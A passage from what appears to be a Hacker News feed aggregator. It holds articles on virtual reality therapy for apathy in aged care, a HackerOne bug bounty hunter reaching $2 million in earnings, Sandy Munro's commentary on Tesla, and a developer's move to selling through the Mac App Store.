                                <figure data-orig-width="1920" data-orig-height="1434"><img src="https://64.media.tumblr.com/577dadbe98ca7fc14ec03186a49592a7/c46a0cc30532ae2d-69/s1280x1920/77608793af860b899b04bb98e024234963c9aa4d.png" data-orig-width="1920" data-orig-height="1434" width="1280" height="956" alt="image"></figure><p><b>- By <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.unisa.edu.au%2F&amp;t=NGVhYjg4MjNmNzcwMTJkZTExOGM3OGUyMTVlMjM2ZGZlY2NiOWUwYSxoaGtrMUxQVw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638328641529479168%2Fvr-improving-apathy-in-aged-care&amp;m=0&amp;ts=1608915755">University of South Australia</a> -</b></p><p>Cutting-edge technology is normally associated with youth, but a group of aged care residents in Adelaide, Australia are learning how useful (and how much fun) virtual reality can be.</p><p>Recalling their past adventures and most positive memories through VR technology is helping residential aged care residents at <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.helpinghand.org.au%2F&amp;t=MjA0Yzc3YjkwMTgxZGFkN2UxZWQ0MjliYzgwYzg1ZWE5NTE0ZTQyMCxoaGtrMUxQVw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638328641529479168%2Fvr-improving-apathy-in-aged-care&amp;m=0&amp;ts=1608915755">Helping Hand</a> to improve their mental health, thanks to a new study by the University of South Australia.</p><p>UniSA PhD candidate Jim Saredakis is using virtual reality to address widespread apathy in aged care homes, which hastens cognitive decline and can affect up to 84 per cent of older residents.</p><p>“Lack of interest in life and loss of motivation are extremely common among people in aged care homes,” Saredakis says. “Apathy contributes to a poorer quality of life and is associated with a three-fold risk of earlier death compared to those without apathy.”</p><p>Music and art therapy are often used to motivate aged care residents, but virtual reality can be used as a powerful tool for “reminiscence therapy” which allows seniors to immersive themselves in happier memories from their past.</p><p>Saredakis tailored VR experiences for 17 residents at Helping Hand, interviewing each about their life history with a focus on positive memories and then sourcing content specifically for each person.</p><p>The content was viewed through a 360-degree video on head-mounted displays, allowing residents to relive autobiographical memories of travel, favourite places, jobs, family videos and other social connections.</p><p>“It’s a digital life storybook; a powerful tool which takes aged care residents away from the world they’re in and into a happier time and place with no other distractions,” Saredakis says.</p><p>The feedback has been overwhelmingly positive.</p><p>“I saw a visible change in them. The emotional responses were varied (including happy tears) but always positive.”</p><p>More importantly, the improvements in verbal fluency – a key indicator of apathy – were marked.</p><p>The residents with higher levels of apathy recalled a lot more words immediately after the immersive sessions than beforehand, possibly activating specific regions of their brain.</p><p>“We believe that being in the immersive environment stimulates the brain areas involved in verbal fluency,” Saredakis says. “What we found was that people with high levels of apathy said more words after the experience, triggering something in their brain. It was an immediate effect and we don’t know how long it lasts.”</p><p>Some negative side effects of the virtual reality experience were reported, including dizziness and nausea – like motion sickness – and some eye strain. However, all participants endorsed the project and said it was their favourite activity in the home.</p><p>“The fact that residents with the highest levels of apathy showed the most improvements tells us that virtual reality could help improve the lives of older adults in residential aged care,” Saredakis says.</p><p>This research is currently being expanded to directly examine apathy and compare virtual reality to traditional forms of reminiscence therapy and a usual care group.</p><p><i>Notes:&nbsp;The 17 residents from Helping Hand came from a high socioeconomic background and most were well educated.</i></p><p><i>–</i></p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.unisa.edu.au%2FMedia-Centre%2FReleases%2F2020%2Faged-care-residents-experience-a-different-kind-of-reality%2F&amp;t=MjIwYWQ3NDNjMzM0MGUwZjg1OGU3Yjc1YmI2ZmMyM2NhM2Y5ZmFkOSxoaGtrMUxQVw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638328641529479168%2Fvr-improving-apathy-in-aged-care&amp;m=0&amp;ts=1608915755">University of South Australia</a></b></p><p><b>Full study:</b>&nbsp;“Using Virtual Reality to Improve Apathy in Residential Aged Care: Mixed Methods Study”,&nbsp;<i>Journal of Medical Internet Research</i>.</p><p><a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fdx.doi.org%2F10.2196%2F17632&amp;t=MDJhMDFkYWFmZjkyYzZkNzc1OGY5NzRhNjQ2Y2IyZWQ4MWZhNmRhOCxoaGtrMUxQVw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638328641529479168%2Fvr-improving-apathy-in-aged-care&amp;m=0&amp;ts=1608915755">http://dx.doi.org/10.2196/17632</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/186224862472/ar-can-be-good-for-seniors-too">AR can be good for seniors too</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/geriatrics">geriatrics</a>
                                    
                                        <a href="https://nuadox.com/tagged/vr">vr</a>
                                    
                                        <a href="https://nuadox.com/tagged/virtual-reality">virtual reality</a>
                                    
                                        <a href="https://nuadox.com/tagged/gerontology">gerontology</a>
                                    
                                        <a href="https://nuadox.com/tagged/aged-care">aged care</a>
                                    
                                        <a href="https://nuadox.com/tagged/senior-citizens">senior citizens</a>
                                    
                                        <a href="https://nuadox.com/tagged/aging">aging</a>
                                    
                                        <a href="https://nuadox.com/tagged/psychology">psychology</a>
                                    
                                        <a href="https://nuadox.com/tagged/psychiatry">psychiatry</a>
                                    
                                        <a href="https://nuadox.com/tagged/apathy">apathy</a>
                                    
                                        <a href="https://nuadox.com/tagged/seniors">seniors</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/638328641529479168/vr-improving-apathy-in-aged-care</link>
            <guid isPermaLink="false">hacker-news-small-sites-25522274</guid>
            <pubDate>Wed, 23 Dec 2020 21:11:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacker Makes $2M in Bug Bounties]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25522189">thread link</a>) | @hackerpain
<br/>
December 23, 2020 | https://savebreach.com/hacker-makes-2-million-dollars-in-bug-bounties/ | <a href="https://web.archive.org/web/*/https://savebreach.com/hacker-makes-2-million-dollars-in-bug-bounties/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1562813733-b31f71025d54?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDV8fGhhY2tlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 300w,
                            https://images.unsplash.com/photo-1562813733-b31f71025d54?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDV8fGhhY2tlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 600w,
                            https://images.unsplash.com/photo-1562813733-b31f71025d54?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDV8fGhhY2tlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 1000w,
                            https://images.unsplash.com/photo-1562813733-b31f71025d54?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDV8fGhhY2tlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1562813733-b31f71025d54?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDV8fGhhY2tlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Hacker makes $2 Million Dollars in Bug Bounty earnings">
            </figure>

            <section>
                <div>
                    <p>Bug Bounty hunting is one of the most lucrative side hustles for the vast majority of hackers and security researchers out there. &nbsp;Security breaches like the SolarWinds Supply Chain Attack always remind us that it doesn't need much effort for attackers to find a weak point in systems and leverage that to gain persistence in networks – while it's not likely that's the way the attackers got in, but we had reported how <a href="https://savebreach.com/solarwinds-exposed-ftp-credentials-back-in-2018-says-security-researcher-vinoth/">SolarWinds had exposed a critical FTP credential through a GitHub commit since 2018</a>, only brought to their notice in late 2019. A brilliant way to prevent such breaches is to crowdsource talent, security is very hard to get right but when you have a thousand different eyes looking into it, it's very probable that they will find issues and edge cases you never thought in the development cycle of your applications – and that's where a Bug Bounty Program fills the gap.</p><p>A large number of WhiteHats now just rely on bug bounties as their only source of income, and it all begins to makes sense – when you see Hackers making millions through their art of hacking. Full time (independent) hacking is becoming a thing, as we have entered the age of bug bounties. Bug Bounties are no longer a disorganized sector, but with more platforms it has almost become a mainstream profession.</p><p>Almost a year back, <a href="https://hackerone.com/">Hackerone</a> had announced that Cosmin (<a href="https://hackerone.com/inhibitor181">@inhibitor181</a>) had reached $1 Million dollars in bug bounty earnings across their platform, and officially become the 7th Bug Bounty millionaire on the platform. Today, they tweeted that <a href="https://twitter.com/inhibitor181">@inhibitor181</a> has completed $2 Million dollars in bug bounty earnings which makes it an important landmark for the Bug Bounty industry, and the highest till date. Is it a vantage point or, will there be someone who will cross this?</p><h3 id="-1-million-dollars-in-bug-bounties-in-less-than-an-year">$1 Million Dollars in bug bounties in less than an year</h3><p><a href="https://hackerone.com/">Hackerone</a> <a href="https://www.hackerone.com/blog/congratulations-cosmin-worlds-seventh-million-dollar-bug-bounty-hacker">had earlier announced less than an year back</a> that Cosmin became the 7th hacker to have become a bug bounty millionaire. Now, he has crossed the $2M mark in all-time earnings, which means <a href="https://hackerone.com/inhibitor181">@inhibitor181</a> might have made $1M in bounties less than an year, on Hackerone itself.</p><h4 id="a-million-dollar-salary-with-just-about-4-years-of-work-experience">A Million dollar salary with just about 4 years of work experience</h4><p>At the age of 30, and with just 4 years of experience in bug bounty hunting, Cosmin makes $1 million in bug bounties a year from <a href="https://hackerone.com/inhibitor181">468<br>bugs that he reported on Hackerone</a>, and has made $2 million so far in bug bounties.</p><p>This is way higher than the pay of most senior position tech jobs or, cybersecurity/infosec jobs that we know. From Cosmin's <a href="https://hackerone.com/inhibitor181">Hackerone profile</a>, we came to know he joined the platform only around 4 years back in 2016 – with just about 4 years of experience (which is even less than what one can consider mid-level experience), a bug bounty hunter is able to earn $1M an year and make $2M in all time earnings. </p><figure><blockquote data-width="550"><p lang="en" dir="ltr">334 days ago we announced Cosmin as the 7th hacker to reach $1 million dollars in earnings. Today we celebrate his achievement to be the FIRST to reach $2 million! Please join us in congratulating <a href="https://twitter.com/inhibitor181?ref_src=twsrc%5Etfw">@inhibitor181</a>! 🥳<a href="https://twitter.com/hashtag/TogetherWeHitHarder?src=hash&amp;ref_src=twsrc%5Etfw">#TogetherWeHitHarder</a> <a href="https://t.co/RGIKTog1mo">pic.twitter.com/RGIKTog1mo</a></p>— HackerOne (@Hacker0x01) <a href="https://twitter.com/Hacker0x01/status/1341811657647919104?ref_src=twsrc%5Etfw">December 23, 2020</a></blockquote>

<figcaption>Ethical hacker, Cosmin @inhibitor181 made $2 million dollars doing bug bounty hunting as per Hackerone's tweet</figcaption></figure><p>Taking the facts into account, with just a few years of experience, most skilled hackers can make six figure salaries from bug bounty hunting. This makes it approachable for a large number of entry-level cybersecurity job seekers.</p><h2 id="the-bug-bounty-millionaires">The Bug Bounty Millionaires</h2><p>There are 9 bug bounty millionaires in the world, and Cosmin, one of them, but the richest as of date. List of the nine Bug Bounty millionaires are as follows – </p><ul><li>Cosmin Lordache (<a href="https://twitter.com/inhibitor181">@inhibitor181</a>), from Germany -<strong> $2M+</strong></li><li>Nathaniel Wakelam (<a href="https://hackerone.com/nnwakelam">@nnwakelam</a>), from Australia - <strong>$1.8M+</strong></li><li>Mark Litchfield (<a href="https://hackerone.com/mlitchfield">@mlitchfield</a>), from U.K. - $1M<strong>+</strong></li><li>Frans Rosen (<a href="https://hackerone.com/fransrosen">@fransrosen</a>), from Sweden - $1M<strong>+</strong></li><li>Ron Chan (<a href="https://hackerone.com/ngalog">@ngalog</a>), from Hong Kong - $1M<strong>+</strong></li><li>Tommy DeVoss (<a href="https://hackerone.com/dawgyg">@dawgyg</a>), from the U.S.A. - $1M<strong>+</strong></li><li>Eric (<a href="https://hackerone.com/todayisnew">@todayisnew</a>), from Canada - $1M<strong>+</strong></li><li>Jon Colston (<a href="https://hackerone.com/mayonaise" rel="nofollow noopener">@mayonaise</a>) - $1M<strong>+</strong></li><li>Santiago Lopez (<a href="https://twitter.com/santi_lopezz99">@santi_lopezz99</a>), youngest at the <strong>age of 19</strong> and the<strong> first bug bounty millionaire </strong>- $1M<strong>+</strong></li></ul><h4 id="highlights">Highlights</h4><p>Among them, Santiago Lopez (<a href="https://hackerone.com/try_to_hack">@try_to_hack</a>) was the <strong>first bug bounty millionaire</strong> at just the age of 19. </p><p>Nathaniel Wakelam (<a href="https://twitter.com/nnwakelam">@nnwakelam</a>) said, <a href="https://twitter.com/nnwakelam/status/1341871544587362304?s=20">he's just $200k short of reaching $2 Million</a> dollars in bug bounties, and hopes to reach $3M, as per the tweet.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Beat me by $200k. Congratulations to <a href="https://twitter.com/inhibitor181?ref_src=twsrc%5Etfw">@inhibitor181</a>! See you at 3M. <a href="https://t.co/mGg1wlVJ2t">https://t.co/mGg1wlVJ2t</a></p>— Хавиж Наффи 🥕 (@nnwakelam) <a href="https://twitter.com/nnwakelam/status/1341871544587362304?ref_src=twsrc%5Etfw">December 23, 2020</a></blockquote>

</figure><p><strong>Note: '+' </strong>indicates it's unknown if or, how much more they have earned beyond $1M since their earnings were last published.</p><h3 id="bug-bounties-give-hackers-a-respectable-source-of-income">Bug Bounties give Hackers a respectable source of income</h3><p><a href="https://www.hackerone.com/resources/reporting/the-2020-hacker-report">Hackerone reportedly paid out $40 million dollars</a> in bug bounties in 2019 alone, and $82 million dollars in total. Hacking which was considered bad not long ago, is now a respectable source of income for many people around the globe. </p><h3 id="is-hacking-good-or-bad">Is Hacking good or, bad?</h3><p>As per <a href="https://www.hackerone.com/resources/reporting/the-2020-hacker-report">Hackerone's survey</a>, 82% Americans think hackers can expose weaknesses in systems rather than engaging in malicious activities. This shows that the perception about whitehat hackers is gradually changing. Also, companies seem to prefer hiring people with hacking skills in security roles. In cybersecurity jobs, the focus of hiring is gradually shifting to people with advanced hacking skills than those with certificates and degrees.</p><h2 id="some-facts-about-hackerone">Some Facts about Hackerone</h2><p><a href="https://hackerone.com/">Hackerone</a> is one of the top Bug Bounty platforms. There are more bug bounty platforms like Bugcrowd, YesWeHack and so on, but Hackerone seems to have the largest market share and the only one where bug bounty hunters were able to make millions exclusively.	</p><p>Hackers from over <strong>170 countries</strong> have been hunting for bugs on Hackerone, Hackerone said in <a href="https://www.hackerone.com/resources/reporting/the-2020-hacker-report">their 2020 Hacker Report</a>. There are over<strong> 6,00,000</strong> bug bounty hunters on Hackerone.</p><p>Hackerone hosts programs from over <strong>1,700 companies and government agencies </strong>on their platform.</p><figure><img src="https://savebreach.com/content/images/2020/12/image-6.png" alt="" srcset="https://savebreach.com/content/images/size/w600/2020/12/image-6.png 600w, https://savebreach.com/content/images/2020/12/image-6.png 785w" sizes="(min-width: 720px) 720px"><figcaption>Geographic Money Flow visualized in the Hacker Report (by Hackerone)</figcaption></figure><p>So far, <strong>50 Hackers</strong> made <strong>six figures </strong>($100,000) in bug bounties in 2019, while most hackers tend to earn less than $20k per year. The figure though small is indicative that there's huge potential in bug bounty hunting for aspiring hackers.</p><p><strong>18% hackers</strong> are hacking <strong>full time</strong>, which though a small number is quite reassuring that Bug Bounty Hunting is becoming a full-time profession for many.</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to SaveBreach | Cyber Security, InfoSec, Bug Bounty &amp; Domain Names</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://savebreach.com/hacker-makes-2-million-dollars-in-bug-bounties/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25522189</guid>
            <pubDate>Wed, 23 Dec 2020 21:01:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[‘Elon Musk lies a lot’, Sandy Munro discusses Tesla vs. the auto industry]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25521776">thread link</a>) | @CarCooler
<br/>
December 23, 2020 | https://www.teslaoracle.com/2020/12/23/elon-musk-lies-a-lot-sandy-munro-tesla-vs-auto-industry/ | <a href="https://web.archive.org/web/*/https://www.teslaoracle.com/2020/12/23/elon-musk-lies-a-lot-sandy-munro-tesla-vs-auto-industry/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
			<figure data-amp-original-style="margin-bottom:30px;">
            <figcaption data-amp-original-style="border:1px dotted blue; margin:2px 0; text-align:center;">Advertisement</figcaption>
            <amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="4076643206" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
              
            </amp-ad>
            </figure>
				<!-- .Adsense Ad -->

		
<p>In his latest interview, engineer, analyst, and vehicle teardown wizard Sandy Munro discusses the future of the automotive industry and the role of Tesla in detail. Munro opened up about which companies he thinks can rival <a href="https://www.teslaoracle.com/">Tesla</a> in the future and why most of them are still on the wrong path towards their ultimate doom. </p>



<p>I am going to jot down the major points he made on the show, you can directly jump to the video below by <a href="#video">clicking here</a>.</p>



<h2>Elon Musk lies a lot</h2>



<p>According to Sandy Munro, the CEO of one of the largest S&amp;P 500 companies, Mr. Elon Musk “lies a lot” — he is actually saying that Musk has developed a habit of understating and over-delivering. </p>



<p>Elon Musk does not fully disclose his next move, he just gives a hint and hides the most important stuff, just like the genius he is.</p>



<p>For example, the <a href="https://www.teslaoracle.com/tag/battery-day/">Tesla Battery Day</a> was hyped for a long time but no one exactly knew what the new <a href="https://www.teslaoracle.com/2020/09/25/tesla-4680-cell-analyzed-sandy-munro/">4680 cells</a> looked like or even what the form factor or dimensions were, Chemistry is still a mystery. <a href="https://www.teslaoracle.com/2020/09/23/model-y-giga-casting-structural-battery-innovations-battery-day-part-1/#presentation">The presentation</a> showing a 56% cost reduction in batteries was also unprecedented.</p>



<p>Sandy Munro says the new Tesla 2170 battery cells have almost eliminated cobalt and added more nickel, that’s the reason Musk was looking for <a href="https://www.reuters.com/article/us-tesla-nickel-idUSKCN24O0RV" target="_blank" rel="noreferrer noopener">nickel mines</a> a while ago.</p>



<p>Comparing Musk to the rest of the auto industry executives, he said the general public knows almost none of them, the only exception would be Volkswagen Chairman Herbert Diess. The reason behind this hiding is that they’re fearful of not being able to hit the bar which is set so high by <a href="https://www.teslaoracle.com/topic/elon-musk/">Elon Musk</a>.</p>



<div><figure><a href="https://evannex.com/?ref=Iqtidar_TeslaOracle_EVANNEX_Banner" target="_blank" rel="sponsored noopener noreferrer"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/10/evannex_googlead_300x250.jpg" alt="" width="300" height="250" layout="intrinsic" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/10/evannex_googlead_300x250.jpg" alt="" width="300" height="250" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzI1MCcgd2lkdGg9JzMwMCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption>– Sponsored –</figcaption></figure></div>



<h2>QuantumScape, solid-state batteries, and Volkswagen</h2>



<p>Munro thinks if there would be any rival of Tesla’s 4680 lithium-ion battery in the next two years, it would be QuantumScape’s solid-state lithium-metal batteries. According to his knowledge, since Volkswagen has a big share in Bill Gates-backed QuantumScape, VW will be the only company rivaling Tesla in the EV marketplace in the near-term future.</p>



<p><a href="https://www.teslaoracle.com/tag/sandy-munro/">Sandy Munro</a> is of the view that still it would take a lot of finessing to do with the solid-state batteries, “it will not be an easy trick,” he says.</p>



<figure></figure>



<figure>
<amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="7514654329" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
  
</amp-ad>
</figure>



<figure><blockquote><p>Anybody who isn’t up to their necks into EVs is pretty much toast!</p><cite>Sandy Munro</cite></blockquote></figure>



<h2>Auto Industry analysts are deprecated</h2>



<p>“I don’t take analysts seriously,” expresses Sandy Munro in his <a href="#video">interview video</a>. He even said that mainstream media is also skipping automotive analysts and taking the viewpoints of experts like him, it’s the new norm.</p>



<p>According to Sandy Munro’s analysis, 2021 is going to be a decisive year for the auto industry as <a href="https://www.xautoworld.com/rivian/rivian-opens-configurator-package/">Rivian’s R1T Pickup Truck and R1S SUV</a> plus the <a href="https://www.teslaoracle.com/topic/cybertruck/">Tesla Cybertruck</a> deliveries will begin. It’s going to be hard on the traditional automotive companies.</p>



<h2>Rivian R1T vs. Hummer EV</h2>



<p>For his next teardown projects, Sandy Munro has already selected the Cybertruck but to meet the budget requirements, his company had to choose between the Rivian R1T and Hummer EV.</p>



<p>Munro &amp; Munro Associates ran a poll online and asked their 100k+ subscribers what they should do. According to Munro, 97% of the audience wanted to see the Rivian R1T teardown to its last screw. Rivian wins, Hummer EV loses — game over GMC.</p>



<h2>Giga Casting is the future of auto manufacturing</h2>



<p>For the past 10 years, Sandy Munro has been showing auto executives the giant underbody die casts sitting at his factory. “I think you’ve lost your mind,” this is the usual reply he got from them for all those years.</p>



<figure data-amp-lightbox="true"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine-1024x507.jpg" alt="Tesla Model Y Giga Die Cast machines." width="700" height="346" srcset="https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine-1024x507.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine-300x148.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine-768x380.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine-1536x760.jpg 1536w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine-1200x594.jpg 1200w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine.jpg 1700w" sizes="(max-width: 700px) 100vw, 700px" data-amp-lightbox="" lightbox="" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" src="https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine-1024x507.jpg" alt="Tesla Model Y Giga Die Cast machines." width="700" height="346" srcset="https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine-1024x507.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine-300x148.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine-768x380.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine-1536x760.jpg 1536w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine-1200x594.jpg 1200w, https://www.teslaoracle.com/wp-content/uploads/2020/12/Tesla-Model-Y-Giga-Casting-Machine.jpg 1700w" sizes="(max-width: 700px) 100vw, 700px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM0Nicgd2lkdGg9JzcwMCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>Tesla Model Y Giga Die Cast machines at Gigafactory Shanghai, China. Source: Tesla (<a href="https://www.teslaoracle.com/tag/tsla/">TSLA</a>)</figcaption></figure>



<p>Now <a href="https://www.teslaoracle.com/topic/model-y/">Tesla Model Y</a> at the <a href="https://www.teslaoracle.com/tag/giga-shanghai/">Gigafactory Shanghai</a>, <a href="https://www.teslaoracle.com/tag/tesla-fremont/">Fremont Factory</a> are made with single-piece front and rear Giga Castings. Tesla went ahead of the curve too early. According to Munro, this innovation alone will get rid of 1/3 of the body shop at Tesla. <a href="https://www.teslaoracle.com/tag/giga-berlin/">Giga Berlin</a> is set to start production with 8 Giga Casting machines next year.</p>



<figure><div>
<amp-youtube data-videoid="zWIU4OZ9OTI" layout="responsive" width="16" height="9" title="Sandy Munro: What the auto industry isn't telling you about Tesla" i-amphtml-layout="responsive"><i-amphtml-sizer></i-amphtml-sizer><a placeholder="" href="https://www.youtube.com/watch?v=zWIU4OZ9OTI"><amp-img src="https://i.ytimg.com/vi/zWIU4OZ9OTI/hqdefault.jpg" layout="fill" object-fit="cover" alt="Sandy Munro: What the auto industry isn't telling you about Tesla" i-amphtml-layout="fill"></amp-img></a></amp-youtube>
</div></figure>
		<!-- Adsense Matched -->
        <figure>
        <amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="9763094783" data-auto-format="mcrspv" data-full-width="" i-amphtml-layout="fixed">
          
        </amp-ad>
        </figure><!-- Adsense Matched End -->
		</div></div>]]>
            </description>
            <link>https://www.teslaoracle.com/2020/12/23/elon-musk-lies-a-lot-sandy-munro-tesla-vs-auto-industry/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25521776</guid>
            <pubDate>Wed, 23 Dec 2020 20:25:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Going All in on the Mac App Store]]>
            </title>
            <description>
<![CDATA[
Score 115 | Comments 187 (<a href="https://news.ycombinator.com/item?id=25521679">thread link</a>) | @s3cur3
<br/>
December 23, 2020 | https://www.unboundapp.com/blog/mac-app-store/ | <a href="https://web.archive.org/web/*/https://www.unboundapp.com/blog/mac-app-store/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
        

        <section>
            <p>With the announcement of the <a href="https://developer.apple.com/app-store/small-business-program/">App Store Small Business Program</a>, I’ve stopped selling Unbound directly via the web site. I thought it would be worth explaining how I came to that decision.</p>
            <p>The original motivation for selling the app directly was simple: Apple took a 30% cut of sales, whereas <a href="https://paddle.com/">Paddle</a>, the payment processor &amp; authentication tool I was using to sell directly only took [<em>not-publicly-disclosed-but-substantially-less-than–30</em>]%. With the drop in Mac App Store fees, that gap has shrunk considerably… to the point that it’s no longer worth keeping Paddle around.</p>
            <h2 id="directsalesareaworseexperienceforcustomers">1. Direct sales are a worse experience for customers.</h2>
            <p>From a customer’s perspective, every direct sale is its own little special snowflake, and you have to figure out how to get your license key, where in the app to enter it, etc. </p>
            <p>For the most tech-savvy users, this is pretty much a non-issue (until, of course, you migrate to a new computer and have to dig through your email to find your product key—good luck!). But a substantial percentage of users had trouble with this, and it was the #1 source of support requests for me.</p>
            <p>In contrast, virtually <em>every</em> Mac user is familiar with the Mac App Store. (And even if they aren’t, it can’t be a <em>worse</em> experience than trying to figure out a third-party platform!) Moving installs between machines is a non-issue, and there’s no such thing as an activation problem. </p>
            <h2 id="directsalesincreasetheoverheadofeachrelease">2. Direct sales increase the overhead of each release.</h2>
            <p>Unbound is not my day job, and revenue-wise, it probably doesn’t have any conceivable path to become my full-time income. (I’m measuring my income here in <a href="https://twitter.com/TylerAYoung/status/1341815721182056465" target="_blank">lattes per month</a>!) That means I can only work on it during nights &amp; weekends—a rather limited amount of time.</p>
            <p>For that reason, I want to maximize the time I actually spend shipping new features. Selling directly meant that I had to cut two builds, and go through two release processes, every time I wanted to ship an update. (And of course I’ve already mentioned the support burden of direct sales—support takes time directly away from development!)</p>
            <h2 id="directsalesareasecurityandprivacyliability">3. Direct sales are a security and privacy liability.</h2>
            <p>If Paddle suffered a data breach, suddenly <em>I</em> would be on the hook for exposing people’s emails or (God forbid) credit card data. While this has <em>not</em> happened, and I have no reason whatsoever to think Paddle is anything but competent, I’m still much happier trusting Apple’s security practices than <em>any</em> third party. (And if <em>Apple</em> has a security breach, I feel like I’m unlikely to take the blame from customers—the vast majority of them have done business with Apple directly in the past, whether for their computers, phones, or even just iTunes purchases.)</p>
            <p>Even apart from a data breach, removing all third parties from the equation is a privacy win for customers—I can proudly tell people the app collects <em>no</em> data whatsoever, whereas Paddle had to “phone home” to validate product keys.</p>
            <h2 id="itsjustnotworthitanymore">It’s just not worth it any more.</h2>
            <p>Given all that, the math just doesn’t work out in support of doing direct sales any more. Even if I moved sales to accepting credit cards directly, a 3.5% fee with all those downsides is substantially worse for both me and my customers than a flat 15%.</p>
            <p>Onward and upward!</p>
            <p>– Tyler</p>
            <p>Let me know what you think—find me on Twitter <a href="https://twitter.com/TylerAYoung">@TylerAYoung</a> or email me at my first name at unboundapp.com.</p>
